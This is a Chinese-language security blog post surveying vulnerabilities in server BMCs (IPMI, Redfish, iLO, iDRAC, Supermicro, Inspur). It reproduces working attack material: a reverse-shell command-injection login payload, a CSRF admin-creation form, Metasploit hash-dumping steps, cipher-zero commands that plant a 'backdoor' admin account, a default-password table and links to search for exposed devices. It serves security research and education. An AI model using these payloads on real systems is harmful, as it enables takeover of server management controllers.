> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [delikely.github.io](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/)

> BMC 历史漏洞汇总刚开始接触 BMC 以为研究的人比较少，感觉一般人也没有机会接触到。

刚开始接触 BMC 以为研究的人比较少，感觉一般人也没有机会接触到。尤其是服务器风扇的声音，一般人也不想去碰。去查了一下 CVE 之后，发现有不少漏洞，还挺多人玩的。近期也在研究这一块，把 BMC 曾曝出的漏洞做个汇总，看看大佬们都有哪些奇妙的思路。

**BMC**(Baseboard Management Controller) 即**基板管理控制器**，提供 IPMI/Redfish 架构中的智能特性。它是嵌入在计算机（通常是服务器）主板上的专用微控制器。 BMC 负责管理系统管理软件和平台硬件之间的接口。用于计算机系统的带外管理和管理员操作监视。提供的服务包括服务器物理健康状态检测，服务器软硬件信息和运行状态查询、开关机、远程安装操作系统等。

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/hpe-ilo-firmware-chip-e1497050696145.jpg)

有了 BMC，运维人员可以通过浏览器等远程控制服务器（下图是 HPE ILO 后台），比如开关机、装系统、进入服务器终端等，而不用跑到机房忍受高温、令人崩溃的声音。而我们搞安全的就不一样，就喜欢听（被迫，要连接串口线)，都不用降噪耳机呢！

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/StorageReview-HPE-iLO_5_Image02-1623380128260.png)

### [](#云服务器带外管理 "云服务器带外管理")云服务器带外管理

带外管理是指远程客户端通过网络物理通道对服务器进行控制管理和维护。常见的带外管理接口有 IPMI 和 Redfish。

#### [](#IPMI "IPMI")IPMI

1998 年，由 Intel 和 HP 主推的 IPMI 标准，引入了单独的带外管理芯片 BMC。智能平台管理接口（IPMI）是一套为自主计算机子系统定义的计算机接口规范，用于提供独立于主机系统的 CPU，固件（BIOS 或 UEFI）和操作系统等软硬件的管理和监视功能。 IPMI 定义了一套系统管理员接口，格式统一格式，对下层透明，可以架构在网络、串行 / Moderm 接口、IPMB（I2C）、KCS、SMIC、SMBus 等不同接口上。

IPMI 也在 2015 年公布 2.0 v1.1 标准后，停止更新维护，被 RedFish 永久代替。为了做到兼容，现在不少服务器上仍然支持 IPMI。

IMPI 规范主体架构如下：

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/IPMI-Block-Diagram.png)

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/5574441-c4000c6e2fe166d1.jpg)

使用 IPMI 的 BMC 系统如下所示：

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/5574441-25a9f43dd5005df9.png)

##### [](#IPMI-命令举例 "IPMI 命令举例")IPMI 命令举例

```
ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin chassis status

ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin user list

ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power on
ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin power off

/usr/bin/ipmitool -I lanplus -H 10.88.1.181 -U sysadmin -P admin mc info
```

#### [](#Redfish "Redfish")Redfish

RedFish 标准由 DMTF 组织的 SPMF 论坛维护，它的提出者与 IPMI 的提出者几乎一样。可以说是下一代云服务器带外管理接口。开发 Redfish 的主要原因之一是解决 IPMI 遗留的无法有效解决的安全需求。Redfish 的第 1 版侧重于服务器，为 IPMI - over - LAN 提供了一个安全、多节点的替代品。随后 的 Redfish 版本增加了对网络接口 (例如 NIC、 CNA 和 FC HBA)、PCIe 交换、本地存储、 NVDIMM、多功能适配器和可组合性以及固 件更新服务、软件更新推送方法和安全特权映射的管理。

Redfish 是一种基于 HTTPs 服务的管理标准，利用 RESTful 接口实现设备管理。每个 HTTPs 操作都以 UTF-8 编码的 JSON 的形式，提交或返回一个资源。就像 Web 应用程序向浏览器返回 HTML 一样，RESTful 接口会通过同样的传输机制 (HTTPS)，以 JSON 的形式向客户端返回数据，用于现有客户端应用程序和基于浏览 器的 GUI。

#### [](#API-举例 "API 举例")API 举例

在 Redfish 中，所有资源都是从服务入口点（ root ）链接的，服务入口点始终位于 URL： /redfish/v1。添加用户`/redfish/v1/AccountService/Account`:

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20210611124042688.png)

### [](#含POC的漏洞（部分） "含POC的漏洞（部分）")含 POC 的漏洞（部分）

#### [](#CVE-2020-21224-浪潮-NF5266M5-Cluster-Management-System-命令注入 "CVE-2020-21224 :  浪潮 NF5266M5  Cluster Management System 命令注入")[浪潮 NF5266M5 Cluster Management System 命令注入](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2020-21224</a> : <a target=)

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/1573267238057.png)

用户登录页面中的用户和密码字段存在命令注入漏洞。后台的处理代码类似。

```
var1 = `grep xxxx`
var2 = $(python -c "from crypt import crypt;print crypt('$passwd','$1$$var1')")
```

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/1573268245311.png)

发送 POST 消息实现反弹 shell。

```
op=login&username=1 2\',\'1\'\);  `bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.16.11.81%2F80%200%3E%261`
```

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/1573268596272.png)

#### [](#CVE-2019-19642-SuperMicro-IPMI-命令注入 "CVE-2019-19642: SuperMicro IPMI 命令注入")[SuperMicro IPMI 命令注入](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2019-19642</a>: <a target=)

基于 IPMI 的虚拟媒体服务存在命令注入漏洞，ShareHost 、ShareName、PathToimg 等参数均存在命令注入问题，可以使用反引号 “`” 注入任意命令。

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/superMicro%20impi%20command%20inject.jpg)

#### [](#CVE-2020-15046-SuperMicro-IPMI-03-40-CSRF-添加管理员用户 "CVE-2020-15046: SuperMicro IPMI 03.40 - CSRF(添加管理员用户)")[SuperMicro IPMI 03.40 - CSRF(添加管理员用户)](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2020-15046</a>: <a target=)

CSRF 添加管理员用户 POC :

```
<html>
  
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://SuperMicro-IP/cgi/config_user.cgi" method="POST">
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="hidden"  />
      <input type="submit" value="submit request" />
    </form>
  </body>
</html>
```

[HPE iLO5 XSS](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2018-7117</a>: <a target=)

HPE iLO5 Web 后台 DHCP 选项 15`domain name` 未转移特殊字符，造成了 XSS。

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/xss-1.png)

#### [](#CVE-2017-12542-HPE-ILO4-认证绕过 "CVE-2017-12542: HPE ILO4 认证绕过")[https://127.0.0.1:8443/rest/v1/AccountService/Accounts](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2017-12542</a>: HPE ILO4 认证绕过</h4><p>在访问 <a target=) 时，在 HTTP 头的`Connection`中添加大于等于`29`个字符后，即可绕过验证（下图为成功获取到目标的 iLO 登录用户名）：

![](https://delikely.github.io/2021/06/22/BMC-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/15225766397758.png)

#### [](#CVE-2014-8272-Dell-iDRAC-IPMI-1-5-Session-ID-随机化问题可被预测 "CVE-2014-8272: Dell iDRAC IPMI 1.5 - Session ID 随机化问题可被预测")[Dell iDRAC IPMI 1.5 - Session ID 随机化问题可被预测](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2014-8272</a>: <a target=)

iDRAC 的 session 格式为 0x0200XXYY。三四字节 0x0200 代表 iDRAC 支持的 IPMI 的版本。第一个字节 YY 的取值范围在 0x00~03，表示会话 ID，意味着多点登录的数量不能超过 4 个。第二个字节 XX，在激活阶段使用临时会话 ID 后会 + 1。0x00 具备特殊含义，剩下 28- 1 种可能，从 0x01 ~ 0xFF。

利用：

1.  使用任意账户发送 “Get Session Challenge” 请求获取当前的临时会话 ID。
2.  使用下一个会话 ID 构造 IPMI 命令，这个会话 ID 是临时 ID+3。
3.  重复发送构造的请求，注入到下一个会话中。

利用脚本: [exploit-db](https://www.exploit-db.com/exploits/35770)

#### [](#Supermicro-IPMI-密码泄露 "Supermicro IPMI 密码泄露")Supermicro IPMI 密码泄露

SuperMicro 老版本在 49152 放置了明文密码文件。攻击者可以通过请求服务器 49152 端口的 /PSBlock 文件，就可得到 80 端口 web 管理界面的密码，密码放在 PSBlock 文件中。

#### [](#IPMI-接口漏洞 "IPMI 接口漏洞")IPMI 接口漏洞

IPMI（Intelligent PlatformManagement Interface）智能平台管理接口，原本是一种 Intel 架构的企业系统的周边设备所采用的一种工业标准。IPMI 亦是一个开放的免费标准，用户无需支付额外的费用即可使用此标准。

IPMI 能够横跨不同的操作系统、固件和硬件平台，可以智能的监视、控制和自动回报大量服务器的运行状况，以降低服务器系统成本。IPMI 基于 UDP 协议进行传输，基于该协议建立的远程管理控制服务，默认绑定在 623 端口。

*   大部分设备都存在默认账号和密码。

<table><thead><tr><th>设备</th><th>默认用户名</th><th>默认密码</th></tr></thead><tbody><tr><td><strong>HP</strong> Integrated Lights Out (iLO)</td><td>Administrator</td><td>8 位随机字符</td></tr><tr><td><strong>Dell</strong> Remote Access Card (iDRAC, DRAC)</td><td>root</td><td>calvin</td></tr><tr><td><strong>IBM</strong> Integrated Management Module (IMM)</td><td>USERID</td><td>PASSW0RD (with a zero)</td></tr><tr><td><strong>Fujitsu</strong> Integrated Remote Management Controller</td><td>admin</td><td>admin</td></tr><tr><td><strong>Supermicro</strong> IPMI (2.0)</td><td>ADMIN</td><td>ADMIN</td></tr><tr><td><strong>Oracle/Sun</strong> Integrated Lights Out Manager (ILOM)</td><td>root</td><td>changeme</td></tr><tr><td><strong>ASUS</strong> iKVM BMC</td><td>admin</td><td>admin</td></tr><tr><td><strong>Huawei</strong> Intelligent Baseboard Management Controller(iBMC)</td><td>root</td><td>Huawei12#$</td></tr></tbody></table>

*   [CVE-2013-4786](http://fish2.com/ipmi/remote-pw-cracking.html)：IPMI 2.0 RAKP 密码哈希泄露
    
    在 IPMI RAKP 消息 2 回复中包含获得 HMAC，通过本地爆破可以得到密码。
    
    ```
    $ ipmitool -I lanplus -v -v -v -U ADMIN -P fluffy-wuffy -H 192.168.8.117 chassis identify
    [...]
    Key exchange auth code [sha1] : 0xede8ec3caeb235dbad1210ef985b1b19cdb40496
    [...]
    ```
    
    Metasploit 供了扫描模块 auxiliary/scanner/ipmi/ipmi_dumphashes。
    
    ```
    msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
    msf auxiliary(ipmi_dumphashes) > set RHOSTS 10.0.0.0/24
    msf auxiliary(ipmi_dumphashes) > set THREADS 256
    msf auxiliary(ipmi_dumphashes) > run
    [ ] 10.0.0.59 root:266ead5921000000....000000000000000000000000000000001404726f6f74:eaf2bd6a5 3ee18e3b2dfa36cc368ef3a4af18e8b
    [ ] 10.0.0.59 Hash for user 'root' matches password 'calvin'
    [ ] 10.0.0.59 :408ee18714000000d9cc....000000000000000000000000000000001400:93503c1b7af26abee 34904f54f26e64d580c050e
    [ ] 10.0.0.59 Hash for user '' matches password 'admin'
    ```
    
*   [ipmi_cipher_zero](http://fish2.com/ipmi/cipherzero.html)
    
    远程攻击者可通过使用密码套件 0（又名 cipher zero）和任意的密码，利用该漏洞绕过身份认证，执行任意 IPMI 命令。IPMI 2.0 使用 cipher zero 加密组件时，攻击者只需要知道一个有效的用户名就可以接管 IPMI 的功能。
    
    正常状态下，使用错误的账户是不能建立会话的。
    
    ```
    $ ipmitool -I lanplus -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
    Error: Unable to establish IPMI v2 / RMCP session
    Get User Access command failed (channel 14, user 1)
    ```
    
    添加 `-C 0` 选项，使用 cipher 0 了绕过认证。
    
    ```
    $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
    ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
    1  Administrator    true    false      true      ADMINISTRATOR
    2  (Empty User)    true    false      false      NO ACCESS
    ```
    
    添加一个后门账户。
    
    ```
    $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set name 2 backdoor
    $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user set password 2 password
    $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user priv 2 4
    $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user enable 2
    $ ipmitool -I lanplus -C 0 -H 10.0.0.99 -U Administrator -P FluffyWabbit user list
    ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
    1  Administrator    true    false      true      ADMINISTRATOR
    2  backdoor              true    false      true      ADMINISTRATOR
    $ ssh backdoor@10.0.0.99
    backdoor@10.0.0.99's password: password
    User:backdoor logged-in to ILOMXQ3469216(10.0.0.99)
    iLO 4 Advanced Evaluation 1.13 at  Nov 08 2012
    Server Name: host is unnamed
    Server Power: On
    </>hpiLO->
    ```
    

### [](#漏洞列表（部分） "漏洞列表（部分）")漏洞列表（部分）

BMC 存在的漏洞以 Web 后台管理的居多，IPMI、Redfish 等管理接口也有不少的问题。暴露的漏洞种类繁多，出现的漏洞类型如下, 并列举了部分案例。总体来看命令注入、认证绕过、越权以及信息泄露这四种占比较大，威胁系数也属于最高。

*   XSS
    
    *   CVE-2019-11216: 惠普 iLO5 XSS 漏洞。
    *   CVE-2019-6159: IBM System x IMM XSS 漏洞。
*   CSRF
    
    *   CVE-2020-15046: SuperMicro IPMI 03.40 可利用 CSRF 添加管理员用户。
*   命令注入
    
    *   CVE-2020-21224 : 浪潮 NF5266M5 Cluster Management System 命令注入。
        
    *   CVE-2019-1885: 思科 Integrated Management Controller (IMC) 由于校验不足，导致可通过 redfish 执行任意命令。
        
    *   CVE-2019-19642: SuperMicro IPMI 基于 IPMI 的虚拟媒体服务存在命令注入漏洞。
    *   CVE-2018-9086: Lenovo ThinkServer-branded 服务器固件下载命令存在命令注入漏洞，允许授权用户下载任意代码执行。
*   越权
    
    *   CVE-2018-15774：戴尔 EMC iDRAC 校验不足导致，普通用户可通过 redfish 提升至管理员权限。
    *   CVE-2018-7950/CVE-2018-7951 华为 iBMC JSON 注入修改管理员密码提升至管理员权限。
    *   CVE-2018-7949 : 华为 iBMC 登录功能存在缺陷，低权限用户可获得以及修改管理员密码。
    *   CVE-2018-7941: 华为 iBMC 低权限用户通过上传证书提升至管理员权限。
    *   CVE-2017-17323：华为 iBMC 低权限用户可访问高权限用户才能访问的页面。
*   认证绕过
    
    *   CVE-2018-1668: IBM DataPower Gateway 允许使用 “null” 登录，能够读取 IPMI 的敏感数据。
    *   CVE-2017-12542： HPE iLO5 认证绕过漏洞。
    *   CVE-2013-4784: HP iLO 任意密码绕过, 利用 IPMI cipher 0。
    *   CVE-2014-8272: IPMI 1.5 会话 ID 随机性不足。
    *   CVE-2013-4782: Supermicro 身份验证绕过导致任意代码执行。
    *   CVE-2013-4783: Dell iDRAC6 身份验证绕过导致任意代码执行。
*   加密算法强度不足
    
    *   CVE-2016-6899：华为 iBMC 包含了弱加密算法，攻击者能够解密加密的数据，导致信息泄露。
*   拒绝服务
    
    *   CVE-2016-6900： 华为 iBMC 资源消耗漏洞，造成拒绝服务漏洞。
*   缓冲区溢出
    
    *   CVE-2021-29202: HPE iLO4/5 缓冲区溢出漏洞。
    *   CVE-2013-3623: Supermicrocgi/close_window.cgi 缓冲区溢出任意命令执行。
    *   CVE-2013-3622: Supermicro logout.cgi 缓冲区溢出任意命令执行
*   信息泄露：管理员凭证、任意文件下载、API 接口
    
    *   CVE-2020-14156: [openbmc](https://github.com/openbmc/openbmc) 信息泄露，任何使用 SSH、SCP 访问 MBC 的用户都能去读 `/etc/ipmi_pass`文件，解码认证凭证后能越权到其他用户。
    *   CVE-2014-0860: IBM BladeCenter 高级管理模块 IPMI 明文凭证泄漏。
    *   CVE-2013-4786: IPMI2.0 离线密码爆破漏洞。
    *   CVE-2013-4037: IBM IPMI 明文凭证泄漏。
    *   CVE-2013-4037: IPMI 密码哈希值泄漏漏洞。
*   硬编码：
    
    *   [](https://cve.mitre.org/cgi-bin/cvename.cgi?>CVE-2019-4621: 特殊状态下的默认口令</a></li>
        <li>CVE-2013-4031: IPMI 用户默认账号登录漏洞。</li>
        </ul>
        </li>
        <li><p>逻辑漏洞：</p>
        <ul>
        <li>CVE-2020-26122：浪潮 NF5266M5 服务器固件更新验证脆弱，向固件包中插入恶意代码可获取系统控制权。</li>
        <li>CVE-2019-4169: IBM Open Power Firmware OP910 and OP920 密码更改后原密码不失效。</li>
        <li>CVE-2019-6161: ThinkAgile CP-SB 会话可被重用。</li>
        </ul>
        </li>
        </ul><p></p><h3 id=)[](#公网设备 "公网设备")公网设备
        
        *   [浪潮 - TSCEV4.0](https://www.zoomeye.org/searchResult?q=title%3A%22TSCEV4.0%22)
        *   [HP-iLo - product:”HP iLO”](https://www.shodan.io/search?query=product%3A%22HP+iLO%22)
        
        ### [](#参考 "参考")参考
        
        *   [基于 IPMI 协议的 DDoS 反射攻击分析](https://anquan.baidu.com/article/161)
        *   [IPMI 相关漏洞利用及 WEB 端默认口令登录漏洞](https://www.cnblogs.com/KevinGeorge/p/8716863.html)
        *   [服务器 BMC 技术调研](https://www.jianshu.com/p/e18de3800686)
        *   [服务器基板管理控制器 (BMC) 带外管理功能和性能要求](https://www.cie.org.cn/system/upload/file/20200710/1594365223119079.pdf)
        *   [CVE-2017-12542 简单分析及复现](https://blog.csdn.net/qq_27446553/article/details/79940641)
        *   [ClusterEngineV4.0 Vul](https://github.com/NS-Sp4ce/Inspur/blob/master/ClusterEngineV4.0%20Vul/Readme.md)
        *   [SuperMicro IPMI Exploitation](https://www.dark-sec.net/2019/12/supermicro-ipmi-exploitation.html)
        *   [CVE-2014-8272: A Case of Weak Session-ID in Dell iDRAC](https://labs.f-secure.com/archive/cve-2014-8272/)
        *   [A Penetration Tester’s Guide to IPMI and BMCs](https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/)
        *   [Supermicro IPMI Firmware Vulnerabilities](https://www.rapid7.com/blog/post/2013/11/06/supermicro-ipmi-firmware-vulnerabilities/)
        *   [623/UDP/TCP - IPMI - HackTricks](https://book.hacktricks.xyz/pentesting/623-udp-ipmi)
        *   [Cracking IPMI Passwords Remotely](http://fish2.com/ipmi/remote-pw-cracking.html)
        *   [The Infamous Cipher Zero](http://fish2.com/ipmi/cipherzero.html)
        *   [CVE-2019-6260: Gaining control of BMC from the host processor](https://www.flamingspork.com/blog/2019/01/23/cve-2019-6260:-gaining-control-of-bmc-from-the-host-processor/)
        *   [CVE-2017-13130 - BMC Patrol ‘mcmnm’ - Privilege Escalation via a Vulnerable SUID Binary](https://itm4n.github.io/bmc-patrol-mcmnm-privesc/)
        *   [CVE - iBMC](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=iBMC)
        *   [CVE - iLO](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=iLO)
        *   [CVE - inspur](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=inspur)
        *   [CVE - redfish](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=redfish)
        *   [CVE - ipmi](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=ipmi)
        *   [CVE - BMC](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=BMC)
        *   [CVE - IMM2](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=IMM2)